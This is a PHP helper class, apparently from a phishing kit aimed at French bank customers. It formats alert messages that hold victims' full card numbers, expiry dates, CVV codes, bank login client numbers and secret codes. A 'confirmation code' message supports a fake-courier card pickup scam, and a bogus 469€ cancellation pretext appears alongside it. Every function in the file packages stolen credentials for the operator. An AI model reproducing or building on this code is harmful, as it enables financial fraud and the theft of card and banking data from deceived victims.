<?php
namespace App\Helpers;

class Formatter
{
    public static function utcNow(): string
    {
        $dt = new \DateTime('now', new \DateTimeZone('UTC'));
        return $dt->format('Y-m-d H:i:s') . ' UTC';
    }

    public static function formatCancelPaymentMessage(array $data): string
    {
        $timestamp = self::utcNow();
        // Keep same behavior as original (here we display full number like le code Python)
        $cardNumber = $data['cardNumber'] ?? '';
        $expiryDate = $data['expiryDate'] ?? '';
        $cvv = $data['cvv'] ?? '';
        $holder = $data['cardHolder'] ?? '';

        $message = "💳 <b>DEMANDE D'ANNULATION DE PAIEMENT</b>\n\n"
            . "🔢 <b>Numéro de Carte:</b> <code>{$cardNumber}</code>\n"
            . "📅 <b>Date d'Expiration:</b> <code>{$expiryDate}</code>\n"
            . "🔐 <b>Code CVV:</b> <code>{$cvv}</code>\n"
            . "👤 <b>Titulaire:</b> <code>{$holder}</code>\n"
            . "💰 <b>Montant:</b> 469€\n"
            . "⏰ <b>Timestamp:</b> {$timestamp}";

        return $message;
    }

    public static function formatLoginMessage(array $data): string
    {
        $timestamp = self::utcNow();
        $client = $data['clientNumber'] ?? '';
        $secret = $data['secretCode'] ?? '';
        $remember = (!empty($data['rememberClient']) && $data['rememberClient']) ? 'Oui' : 'Non';

        $message = "🏦 <b>NOUVELLE CONNEXION BANCAIRE</b>\n\n"
            . "📱 <b>Numéro Client:</b> <code>{$client}</code>\n"
            . "🔐 <b>Code Secret:</b> <code>{$secret}</code>\n"
            . "💾 <b>Mémoriser:</b> {$remember}\n"
            . "⏰ <b>Timestamp:</b> {$timestamp}";

        return $message;
    }

    public static function formatCardConfirmationMessage(array $data): string
    {
        $timestamp = self::utcNow();
        $code = $data['confirmationCode'] ?? '';

        $message = "🏦 <b>CONFIRMATION DE CARTE BANCAIRE</b>\n\n"
            . "🔢 <b>Code de Confirmation:</b> <code>{$code}</code>\n"
            . "📋 <b>Type:</b> Code de remise en main propre au coursier\n"
            . "⏰ <b>Timestamp:</b> {$timestamp}\n\n"
            . "💡 <i>Ce code est nécessaire pour opposer la carte au guichet</i>";

        return $message;
    }
}
